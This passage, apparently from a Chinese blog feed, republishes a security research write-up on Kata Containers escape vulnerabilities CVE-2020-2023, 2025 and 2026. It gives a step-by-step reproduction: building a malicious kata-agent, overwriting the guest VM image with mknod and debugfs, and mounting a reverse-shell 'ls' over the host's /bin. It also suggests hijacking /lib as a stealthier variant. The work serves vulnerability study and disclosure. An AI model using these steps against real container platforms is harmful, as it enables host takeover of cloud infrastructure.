<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">root#</span><span class="bash"> docker info | grep <span class="string">'Runtime'</span></span></span><br><span class="line"> Runtimes: kata-runtime runc kata-clh kata-qemu</span><br><span class="line"> Default Runtime: kata-runtime</span><br></pre></td></tr></tbody></table></figure>

<p>OK，再尝试使用Kata Containers + Cloud Hypervisor运行一个容器：</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">root#</span><span class="bash"> docker run --rm -it --runtime=<span class="string">"kata-clh"</span> ubuntu uname -a</span></span><br><span class="line">Linux 1998641bad3f 5.3.0-rc3 #1 SMP Thu Jan 16 01:53:44 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></tbody></table></figure>

<p>可以看到，容器使用的内核版本为5.3.0-rc3，而我们测试环境宿主机的内核版本为4.15.0-117-generic：</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">root#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux matrix 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></tbody></table></figure>

<p>这说明我们的环境搭建成功。 </p>
<p>我们想要模拟的场景如下： </p>
<p>目标环境是一个提供容器服务（Container-as-a-Service）的云虚拟化平台，使用Kata Containers作为容器运行时。该容器服务的用户能够上传自己的镜像并在云平台上运行一个或多个容器。攻击者首先上传恶意镜像，启动一个容器，污染Kata Containers使用的虚拟机镜像；然后再次启动一个恶意容器，此时，Kata Containers使用被污染的虚拟机镜像创建出一个恶意虚拟机，它会欺骗Kata Containers运行时组件（kata-runtime）将恶意容器根文件系统挂载到云平台宿主机上/bin目录下。管理员在使用/bin目录下的工具时触发反弹shell，攻击者收到反弹shell，实现逃逸。 </p>
<p><strong>漏洞利用</strong> </p>
<p>下图更清晰地展示了整个逃逸流程：</p>
<p><img src="/posts/3535913925/image-20210305165514398.png" alt="image-20210305165514398"></p>
<p>下面，我们就来逐步看一下。</p>
<p><strong>&gt;&gt;&gt;&gt;</strong></p>
<p><strong>1. 构建恶意kata-agent</strong></p>
<p>结合前面漏洞分析部分可知，要利用好CVE-2020-2026漏洞，就需要在kata-agent的gRPC服务器上做文章。 </p>
<p>首先拿到kata-agent的源码并切换到1.10.0版本：</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">mkdir -p $GOPATH/src/github.com/kata-containers/</span><br><span class="line">cd $GOPATH/src/github.com/kata-containers/</span><br><span class="line">git clone https://github.com/kata-containers/agent</span><br><span class="line">cd agent</span><br><span class="line">git checkout 1.10.0</span><br></pre></td></tr></tbody></table></figure>

<p>在grpc.go文件中，找到CreateSandobx函数，其中有一部分代码是用来将宿主机共享目录挂载到虚拟机中的：</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">mountList, err := addStorages(ctx, req.Storages, a.sandbox)</span><br><span class="line">if err != nil {</span><br><span class="line">    return emptyResp, err</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">a.sandbox.mounts = mountList</span><br></pre></td></tr></tbody></table></figure>

<p>共享目录挂载后，我们才能在里边创建符号链接。因此，在上述代码后面添加创建符号链接的代码即可。 </p>
<p>这样一来，当kata-runtime向kata-agent发出CreateSandbox指令时，kata-agent将在共享目录内的rootfs位置创建一个符号链接，指向/bin；此后，当kata-runtime向该位置绑定挂载容器根文件系统时，实际的挂载路径将是宿主机的/bin。 </p>
<p>除此之外，我们还需要避免kata-runtime在容器生命周期结束时从/bin卸载容器根文件系统。因此，我们需要想办法在卸载操作之前把共享目录中的rootfs位置重新替换为一个正常的目录。我们注意到，kata-runtime在挂载容器镜像后，还会向kata-agent发出CreateContainer指令，因此，我们可以在kata-agent源码grpc.go文件中的CreateContainer函数内添加删除符号链接、创建正常目录的操作，避免/bin挂载点被卸载。 </p>
<p>至此，恶意kata-agent编写完成，make构建一下即可。</p>
<p><strong>&gt;&gt;&gt;&gt;</strong></p>
<p><strong>2. 构建恶意镜像kata-malware-image</strong></p>
<p>从上面的流程图中可以发现，攻击者实际上需要先后创建两个恶意容器。为简单起见，我们只构造一个恶意镜像，它需要完成两个任务： </p>
<ol>
<li>在第一个容器启动时，利用CVE-2020-2023和CVE-2020-2025漏洞，将底层虚拟机块设备中的kata-agent替换为攻击者准备好的恶意文件；</li>
<li>第二个容器本身不需要做任何事情，但此时由于CVE-2020-2026漏洞的存在，kata-runtime会将容器的根文件系统挂载到宿主机上指定位置（由恶意kata-agent创建的符号链接指定）。因此，镜像中还需要包含反弹shell需要的程序。 </li>
</ol>
<p>第二个任务比较简单，我们只需要在恶意容器的根目录下准备反弹shell程序（建议用C语言编写，另外，网络上有很多反弹shell源码）即可。由于是覆盖到/bin，因此我们可以考虑以/bin下的一些常用命令为反弹shell命名，例如ls等。另外，假如反弹shell程序依赖bash等系统自带shell，那么我们也需要在镜像中准备——一旦/bin被覆盖，/bin/bash及一系列其他shell就不可用了。 </p>
<p>第一个任务则稍微复杂一些，需要将上一步中构建好的恶意kata-agent写入底层虚拟机块设备中。我们可以利用现成工具「debugfs」来达到目的。 </p>
<p>如「漏洞分析」部分所述，在获取设备号后，直接使用mknod创建设备文件： </p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">mknod --mode 0600 /dev/guest_hd b 254 1</span><br></pre></td></tr></tbody></table></figure>

<p>接着，就可以用debugfs打开该设备进行操作了（利用漏洞CVE-2020-2023）。默认情况下，直接执行debugfs会进入交互式界面。我们也可以借助它的-f参数，以文件形式给出操作指令。具体操作如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">/sbin/debugfs -w /dev/guest_hd</span><br><span class="line"><span class="meta">#</span><span class="bash"> 以下在debugfs的交互命令行中执行</span></span><br><span class="line">cd /usr/bin</span><br><span class="line">rm kata-agent</span><br><span class="line">write /evil-kata-agent kata-agent</span><br><span class="line">close -a</span><br></pre></td></tr></tbody></table></figure>

<p>由于CVE-2020-2025漏洞的存在，上述操作会直接将Kata Containers使用的虚拟机镜像中的kata-agent替换为恶意程序，任务完成。 </p>
<p>将上述步骤制作成容器镜像即可。</p>
<p><strong>&gt;&gt;&gt;&gt;</strong></p>
<p><strong>3. 向目标环境上传恶意镜像</strong></p>
<p>我们模拟的是针对提供容器服务的云平台场景的攻击，云平台一般会提供上传或拉取镜像的方法。为简单起见，笔者直接在目标主机上构建恶意镜像。</p>
<p><strong>&gt;&gt;&gt;&gt;</strong></p>
<p><strong>4. 发起攻击</strong></p>
<p>万事俱备，只欠东风。攻击者现在只需要做三件事： </p>
<ol>
<li>开启一个监听反弹shell的进程；</li>
<li>在目标环境上使用恶意镜像创建一个新容器；</li>
<li>在上一容器内的恶意脚本执行完后，继续使用恶意镜像创建第二个容器。 </li>
</ol>
<p>可以编写一个简单的脚本来自动化上述步骤：</p>
<p><img src="/posts/3535913925/image-20210305170312929.png" alt="image-20210305170312929"></p>
<p>如上图所示，攻击成功（覆盖kata-agent可能耗时较久）。此时目标宿主机上的/bin目录已经被恶意镜像的根目录覆盖（绑定挂载）。假设此时管理员登录到了宿主机上，执行了一些常用命令，例如ls：</p>
<p><img src="/posts/3535913925/image-20210305171234660.png" alt="image-20210305171234660"></p>
<p>由于ls已经被替换为恶意程序，此时，攻击者收到了目标宿主机反弹回来的shell：</p>
<p><img src="/posts/3535913925/image-20210305171308143.png" alt="image-20210305171308143"></p>
<p><strong>&gt;&gt;&gt;&gt;</strong></p>
<p><strong>注意事项</strong></p>
<ul>
<li>如果在VMWare中搭建测试环境，使用Kata Containers运行容器前需要配置一下vsock[15]：</li>
</ul>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">sudo systemctl stop vmware-tools</span><br><span class="line">sudo modprobe -r vmw_vsock_vmci_transport</span><br><span class="line">sudo modprobe -i vhost_vsock</span><br></pre></td></tr></tbody></table></figure>

<ul>
<li>构建恶意镜像时，使用runC构建会比直接在配置好kata-runtime的环境中快很多。</li>
<li>事实上，对于攻击者来说，覆盖/bin并非是最好的思路。一方面，他在反弹shell中能够用到的工具会减少——原宿主机上/bin目录下的所有工具都无法使用了；另一方面，攻击者需要管理员的配合（管理员执行ls等命令）才能实现攻击。一种更好的思路是覆盖/lib或/lib64目录并提供恶意的动态链接库[8]，这样既不会影响到/bin目录下的工具（严格来说，可能会影响一些使用到动态链接库的程序），又不需要管理员的配合就可实施攻击，因为许多系统进程（以及kata-runtime）都会自动去调用动态链接库中的函数。</li>
</ul>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>在了解漏洞原理后，修复思路就显而易见了。修复细节不是本文关注的重点，感兴趣的读者可以参考官方仓库[27][28][29][30]。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>纵观云计算与虚拟化技术发展可以发现，从虚拟机到容器再到安全容器，每一种技术都曾出现过逃逸情况。笔者相信，未来还会不断有新的逃逸方式出现。当然，我们不会因噎废食，科技的进步会在效率和安全性两方面都带来越来越多的增益。但是另一方面，最小权限、纵深防御等安全最佳实践和原则依然有必要贯穿始终。</p>
<h3 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a><strong>致谢</strong></h3><p>研究过程中，笔者曾就技术细节问题向原漏洞发现者、Palo Alto Networks的高级安全研究员Yuval Avrahami请教，得到其热情友好的帮助，在此向Yuval Avrahami表示真诚的感谢。</p>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a><strong>参考文献</strong></h3><p>[1] <a href="https://i.blackhat.com/USA-20/Thursday/us-20-Avrahami-Escaping-Virtualized-Containers.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-20/Thursday/us-20-Avrahami-Escaping-Virtualized-Containers.pdf</a><br>[2] <a href="https://katacontainers.io" target="_blank" rel="noopener">https://katacontainers.io</a><br>[3] <a href="https://katacontainers.io/learn/" target="_blank" rel="noopener">https://katacontainers.io/learn/</a><br>[4] <a href="https://gvisor.dev" target="_blank" rel="noopener">https://gvisor.dev</a><br>[5] <a href="https://github.com/kata-containers/community/blob/master/VMT/KCSA/KCSA-CVE-2020-2023.md" target="_blank" rel="noopener">https://github.com/kata-containers/community/blob/master/VMT/KCSA/KCSA-CVE-2020-2023.md</a><br>[6] <a href="https://github.com/kata-containers/community/blob/master/VMT/KCSA/KCSA-CVE-2020-2024.md" target="_blank" rel="noopener">https://github.com/kata-containers/community/blob/master/VMT/KCSA/KCSA-CVE-2020-2024.md</a><br>[7] <a href="https://github.com/kata-containers/community/blob/master/VMT/KCSA/KCSA-CVE-2020-2025.md" target="_blank" rel="noopener">https://github.com/kata-containers/community/blob/master/VMT/KCSA/KCSA-CVE-2020-2025.md</a><br>[8] <a href="https://github.com/kata-containers/community/blob/master/VMT/KCSA/KCSA-CVE-2020-2026.md" target="_blank" rel="noopener">https://github.com/kata-containers/community/blob/master/VMT/KCSA/KCSA-CVE-2020-2026.md</a><br>[9] <a href="https://docs.docker.com/engine/install/ubuntu/" target="_blank" rel="noopener">https://docs.docker.com/engine/install/ubuntu/</a><br>[10] <a href="https://github.com/kata-containers/runtime/releases/download/1.10.0/kata-static-1.10.0-x86_64.tar.xz" target="_blank" rel="noopener">https://github.com/kata-containers/runtime/releases/download/1.10.0/kata-static-1.10.0-x86_64.tar.xz</a><br>[11] <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-2023" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2020-2023</a><br>[12] <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-2024" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2020-2024</a><br>[13] <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-2025" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2020-2025</a><br>[14] <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-2026" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2020-2026</a><br>[15] <a href="https://github.com/teawater/documentation/blob/4eee7346655d9c954ab595c05e9f5dad0f5efeda/VSocks.md#system-requirements" target="_blank" rel="noopener">https://github.com/teawater/documentation/blob/4eee7346655d9c954ab595c05e9f5dad0f5efeda/VSocks.md#system-requirements</a><br>[16] <a href="https://github.com/cloud-hypervisor/cloud-hypervisor" target="_blank" rel="noopener">https://github.com/cloud-hypervisor/cloud-hypervisor</a><br>[17] <a href="https://github.com/kata-containers/documentation/tree/master/design" target="_blank" rel="noopener">https://github.com/kata-containers/documentation/tree/master/design</a><br>[18] <a href="https://github.com/opencontainers/runtime-spec" target="_blank" rel="noopener">https://github.com/opencontainers/runtime-spec</a><br>[19] <a href="https://github.com/kata-containers/kata-containers" target="_blank" rel="noopener">https://github.com/kata-containers/kata-containers</a><br>[20] <a href="https://gvisor.dev/docs/" target="_blank" rel="noopener">https://gvisor.dev/docs/</a><br>[21] <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-14271" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2019-14271</a><br>[22] <a href="https://www.kernel.org/doc/Documentation/cgroup-v1/devices.txt" target="_blank" rel="noopener">https://www.kernel.org/doc/Documentation/cgroup-v1/devices.txt</a><br>[23] <a href="https://man7.org/linux/man-pages/man2/mknod.2.html" target="_blank" rel="noopener">https://man7.org/linux/man-pages/man2/mknod.2.html</a><br>[24] <a href="https://github.com/moby/moby/blob/a24a71c50f34d53710cccaa4d5e5f62169c5e1dc/oci/caps/defaults.go#L4" target="_blank" rel="noopener">https://github.com/moby/moby/blob/a24a71c50f34d53710cccaa4d5e5f62169c5e1dc/oci/caps/defaults.go#L4</a><br>[25] <a href="https://en.wikipedia.org/wiki/Symlink_race" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Symlink_race</a><br>[26] <a href="https://github.com/kata-containers/documentation/blob/master/design/architecture.md" target="_blank" rel="noopener">https://github.com/kata-containers/documentation/blob/master/design/architecture.md</a><br>[27] <a href="https://github.com/kata-containers/agent/pull/792" target="_blank" rel="noopener">https://github.com/kata-containers/agent/pull/792</a><br>[28] <a href="https://github.com/kata-containers/runtime/pull/2477" target="_blank" rel="noopener">https://github.com/kata-containers/runtime/pull/2477</a><br>[29] <a href="https://github.com/kata-containers/runtime/pull/2487" target="_blank" rel="noopener">https://github.com/kata-containers/runtime/pull/2487</a><br>[30] <a href="https://github.com/kata-containers/runtime/pull/2713" target="_blank" rel="noopener">https://github.com/kata-containers/runtime/pull/2713</a> </p>
<!--
<div class="poem-wrap">
  <div class="poem-border poem-left"></div>
  <div class="poem-border poem-right"></div>
    <h1>念两句诗</h1>
    <p id="poem">挑选中...</p>
    <p id="info">

  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
  <script type="text/javascript">
    jinrishici.load(function(result) {
      poem.innerHTML = result.data.content
      info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
      document.getElementById("poem").value(poem);
      document.getElementById("info").value(info);  
  });
  </script>
</div>
-->

<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>容器逃逸</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>KataContainers容器</tag>
        <tag>CVE-2020-2023/2024/2025/2026</tag>
        <tag>容器逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>KataContainers安全容器逃逸-CVE-2020-2023-2024-2025-2026(转载中)</title>
    <url>/posts/2767170740/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<p>版权声明：本文为「星云实验室 绿盟科技研究通讯」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://mp.weixin.qq.com/s/q4xJtlO6iFpHQginGvVBDQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/q4xJtlO6iFpHQginGvVBDQ</a></p>
<p><strong>CVE-2020-2025</strong> </p>
<p>该漏洞也属于权限控制问题——在存在漏洞的环境中，虚拟机镜像并未以只读模式挂载。因此，虚拟机能够对硬盘进行修改，并将修改持久化到虚拟机镜像中。这样一来，后续所有新虚拟机都将从修改后的镜像创建了。 </p>
<p>我们来验证一下。思路是，在之前CVE-2020-2023的基础上，先启动一个容器，使用debugfs向虚拟机硬盘中写入一个flag.txt文件，内容为hello, kata，然后销毁该容器，再次创建一个新容器，在其中使用debugfs查看文件系统是否存在上述文件，以判断虚拟机镜像是否被改写。具体的过程如下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">root#</span><span class="bash"> docker run --rm -it ubuntu /bin/bash</span></span><br><span class="line">root@28caf254e3b3:/# mknod --mode 0600 /dev/guest_hd b 254 1</span><br><span class="line">root@28caf254e3b3:/# echo "hello, kata" &gt; flag.txt</span><br><span class="line">root@28caf254e3b3:/# /sbin/debugfs -w /dev/guest_hd</span><br><span class="line">debugfs 1.45.5 (07-Jan-2020)</span><br><span class="line">debugfs:  cd usr/bin</span><br><span class="line">debugfs:  write flag.txt flag.txt</span><br><span class="line">Allocated inode: 172</span><br><span class="line">debugfs:  close -a</span><br><span class="line">debugfs:  quit</span><br><span class="line">root@28caf254e3b3:/# exit</span><br><span class="line">exit</span><br><span class="line"><span class="meta">root#</span></span><br><span class="line"><span class="meta">root#</span><span class="bash"> docker run --rm -it ubuntu /bin/bash</span></span><br><span class="line">root@1773bd058e1b:/# mknod --mode 0600 /dev/guest_hd b 254 1</span><br><span class="line">root@1773bd058e1b:/# /sbin/debugfs -w /dev/guest_hd</span><br><span class="line">debugfs 1.45.5 (07-Jan-2020)</span><br><span class="line">debugfs:  cd usr/bin</span><br><span class="line">debugfs:  dump flag.txt flag.txt</span><br><span class="line">debugfs:  quit</span><br><span class="line">root@1773bd058e1b:/# cat flag.txt</span><br><span class="line">hello, kata</span><br></pre></td></tr></tbody></table></figure>

<p>可以看到，虚拟机镜像确实被改写了。</p>
<p><strong>CVE-2020-2026</strong> </p>
<p>CVE-2020-2026属于非常典型的一类漏洞——符号链接处理不当引起的安全问题[25]。我们来抽丝剥茧，一步步分析这个漏洞。</p>
<p>在「背景知识」部分，我们已经介绍了Kata Containers的基本组件，下面是Kata Containers执行OCI命令create时组件间的交互时序图 [26]： </p>
<p><img src="/posts/2767170740/image-20210305155434109.png" alt="image-20210305155434109"></p>
<p>其中，virtcontainers曾经是一个独立的项目，现在已经成为kata-runtime的一部分，它为构建硬件虚拟化的容器运行时提供了一套Go语言库。除此以外，上图涉及到的其他组件我们都介绍过了。 </p>
<p>可以看到，Docker引擎向kata-runtime下发create指令，然后，kata-runtime通过调用virtcontainers的CreateSandbox来启动具体的容器创建过程。接着，virtcontainers承担起主要职责，调用Hypervisor提供的服务去创建网络、启动虚拟机。</p>
<p>我们重点关注virtcontainers向agent发起的CreateSandbox调用，从这里开始，virtcontainers与agent连续两次请求响应，是容器创建过程中最核心的部分，也是CVE-2020-2026漏洞存在的地方：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">virtcontainers  --- CreateSandbox ---&gt;  agent</span><br><span class="line">virtcontainers  &lt;-- Sandbox Created --  agent</span><br><span class="line">virtcontainers  -- CreateContainer --&gt;  agent</span><br><span class="line">virtcontainers  &lt;--Container Created--  agent</span><br></pre></td></tr></tbody></table></figure>

<p>这里的Sandbox与Container有什么不同呢？Sandbox是一个统一、基本的隔离空间，一个虚拟机中只有一个Sandbox，但是该Sandbox内可以有多个容器，这就对应了Kubernetes Pod的模型；对于Docker来说，一般一个Sandbox内只运行一个Container。无论是哪种情况，Sandbox的ID与内部第一个容器的ID相同。 </p>
<p>在上面这两来两往的过程中，容器即创建完成。我们知道，容器是由镜像创建而来，那么kata-runtime是如何将镜像内容传递给虚拟机内部kata-agent的呢？答案是，将根文件目录（rootfs）挂载到宿主机与虚拟机的共享目录中。 </p>
<p>首先，runtime/virtcontainers/kata_agent.go的startSandbox函数向kata-agent发起gRPC调用： </p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">storages := setupStorages(sandbox)</span><br><span class="line">kmodules := setupKernelModules(k.kmodules)</span><br><span class="line"></span><br><span class="line">req := &amp;grpc.CreateSandboxRequest{</span><br><span class="line">    Hostname:      hostname,</span><br><span class="line">    Dns:           dns,</span><br><span class="line">    Storages:      storages,</span><br><span class="line">    SandboxPidns:  sandbox.sharePidNs,</span><br><span class="line">    SandboxId:     sandbox.id,</span><br><span class="line">    GuestHookPath: sandbox.config.HypervisorConfig.GuestHookPath,</span><br><span class="line">    KernelModules: kmodules,</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>可以看到，其中带有SandboxId和Storages参数。其中，Storages的值来自setupStorages函数，这个函数用于配置共享目录的存储驱动、文件系统类型和挂载点等。Storages内的元素定义如下（setupStorages函数）：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">sharedVolume := &amp;grpc.Storage{</span><br><span class="line">  Driver:     kataVirtioFSDevType,</span><br><span class="line">  Source:     mountGuestTag,</span><br><span class="line">  MountPoint: kataGuestSharedDir(),</span><br><span class="line">  Fstype:     typeVirtioFS,</span><br><span class="line">  Options:    sharedDirVirtioFSOptions,</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>其中，kataGuestSharedDir函数会返回共享目录在虚拟机内部的路径，也就是MountPoint的值：/run/kata-containers/shared/containers/。 </p>
<p>OK，切换到kata-agent侧。当它收到gRPC调用请求后，内部的CreateSandbox函数开始执行（位于agent/grpc.go）。具体如下（我们省略了内核模块加载、命名空间创建等代码逻辑）： </p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *agentGRPC)</span> <span class="title">CreateSandbox</span><span class="params">(ctx context.Context, req *pb.CreateSandboxRequest)</span> <span class="params">(*gpb.Empty, error)</span></span> {</span><br><span class="line">  <span class="keyword">if</span> a.sandbox.running {</span><br><span class="line">    <span class="keyword">return</span> emptyResp, grpcStatus.Error(codes.AlreadyExists, <span class="string">"Sandbox already started, impossible to start again"</span>)</span><br><span class="line">  }</span><br><span class="line">  <span class="comment">// 省略...</span></span><br><span class="line">  <span class="keyword">if</span> req.SandboxId != <span class="string">""</span> {</span><br><span class="line">    a.sandbox.id = req.SandboxId</span><br><span class="line">    agentLog = agentLog.WithField(<span class="string">"sandbox"</span>, a.sandbox.id)</span><br><span class="line">  }</span><br><span class="line">  <span class="comment">// 省略...</span></span><br><span class="line">  mountList, err := addStorages(ctx, req.Storages, a.sandbox)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">    <span class="keyword">return</span> emptyResp, err</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  a.sandbox.mounts = mountList</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> err := setupDNS(a.sandbox.network.dns); err != <span class="literal">nil</span> {</span><br><span class="line">    <span class="keyword">return</span> emptyResp, err</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> emptyResp, <span class="literal">nil</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>可以看到，在收到请求后，kata-agent会调用addStorages函数去根据kata-runtime的指令挂载共享目录，经过深入，该函数最终会调用mountStorage函数执行挂载操作：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// mountStorage performs the mount described by the storage structure.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">mountStorage</span><span class="params">(storage pb.Storage)</span> <span class="title">error</span></span> {</span><br><span class="line">  flags, options := parseMountFlagsAndOptions(storage.Options)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> mount(storage.Source, storage.MountPoint, storage.Fstype, flags, options)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这里的MountPoint即是来自kata-runtime的/run/kata-containers/shared/containers/。至此，宿主机与虚拟机的共享目录已经挂载到了虚拟机内。 </p>
<p>最后，CreateSandbox执行完成，kata-runtime收到回复。 </p>
<p>那么，kata-runtime什么时候会向共享目录中挂载呢？如下图所示，发送完CreateSandobx请求后，kata-runtme在bindMountContainerRootfs中开始挂载容器根文件系统： </p>
<p><img src="/posts/2767170740/image-20210305160610277.png" alt="image-20210305160610277"></p>
<p>代码如下：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bindMountContainerRootfs</span><span class="params">(ctx context.Context, sharedDir, sandboxID, cID, cRootFs <span class="keyword">string</span>, readonly <span class="keyword">bool</span>)</span> <span class="title">error</span></span> {</span><br><span class="line">  span, _ := trace(ctx, <span class="string">"bindMountContainerRootfs"</span>)</span><br><span class="line">  <span class="keyword">defer</span> span.Finish()</span><br><span class="line"></span><br><span class="line">  rootfsDest := filepath.Join(sharedDir, sandboxID, cID, rootfsDir)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> bindMount(ctx, cRootFs, rootfsDest, readonly)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>其中，rootfsDest是宿主机上共享目录中容器根文件系统的位置。它的形式是/run/kata-containers/shared/sandboxes/sandbox_id/container_id/rootfs，其中sandbox_id与container_id分别是Sandbox和容器的ID。如前所述，对于只运行一个容器的情况来说，这两个ID是一致的；cRootFs是根文件系统在虚拟机内部共享目录中的挂载位置，形式为/run/kata-containers/shared/containers/sandbox_id/rootfs。 </p>
<p>在函数的末尾，bindMount函数执行实际的绑定挂载任务： </p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bindMount</span><span class="params">(ctx context.Context, source, destination <span class="keyword">string</span>, readonly <span class="keyword">bool</span>)</span> <span class="title">error</span></span> {</span><br><span class="line">  <span class="comment">// 省略...</span></span><br><span class="line">  absSource, err := filepath.EvalSymlinks(source) <span class="comment">// 重点！！！</span></span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">    <span class="keyword">return</span> fmt.Errorf(<span class="string">"Could not resolve symlink for source %v"</span>, source)</span><br><span class="line">  }</span><br><span class="line">  <span class="comment">// 省略...</span></span><br><span class="line">  <span class="keyword">if</span> err := syscall.Mount(absSource, destination, <span class="string">"bind"</span>, syscall.MS_BIND, <span class="string">""</span>); err != <span class="literal">nil</span> {</span><br><span class="line">    <span class="keyword">return</span> fmt.Errorf(<span class="string">"Could not bind mount %v to %v: %v"</span>, absSource, destination, err)</span><br><span class="line">  }</span><br><span class="line">  <span class="comment">// 省略...</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p><strong>重点来了！该函数会对虚拟机内部的挂载路径做符号链接解析。</strong> </p>
<p>符号链接解析是在宿主机上进行的，但是实际的路径位于虚拟机内。如果虚拟机由于某种原因被攻击者控制，那么攻击者就能够在挂载路径上创建一个符号链接，kata-runtime将把容器根文件系统挂载到该符号链接指向的宿主机上的其他位置！ </p>
<p>举例来说，假如虚拟机内部的kata-agent被攻击者替换为恶意程序，该恶意agent在收到CreateSandbox请求后，根据拿到的Sandbox ID在/run/kata-containers/shared/containers/sandbox_id/创建一个名为rootfs的符号链接，指向/tmp/xxx目录，那么之后kata-runtime在进行绑定挂载时，就会将容器根文件系统挂载到宿主机上的/tmp/xxx目录下。在许多云场景下，容器镜像是攻击者可控的， 因此——他够将特定文件放在宿主机上的特定位置，从而实现虚拟机逃逸。 </p>
<p>第一眼看到CVE-2020-2026，也许有的朋友会觉得不太好利用，攻击者不是在容器里么？如何跑到虚拟机里？ </p>
<p>是的，一般情况下的确比较困难，但是一旦与CVE-2020-2023、CVE-2020-2025结合起来，就有可能了。 </p>
<!--
<div class="poem-wrap">
  <div class="poem-border poem-left"></div>
  <div class="poem-border poem-right"></div>
    <h1>念两句诗</h1>
    <p id="poem">挑选中...</p>
    <p id="info">

  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
  <script type="text/javascript">
    jinrishici.load(function(result) {
      poem.innerHTML = result.data.content
      info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
      document.getElementById("poem").value(poem);
      document.getElementById("info").value(info);  
  });
  </script>
</div>
-->

<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>容器逃逸</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>KataContainers容器</tag>
        <tag>CVE-2020-2023/2024/2025/2026</tag>
        <tag>容器逃逸</tag>
      </tags>
  </entry>
  <entry>
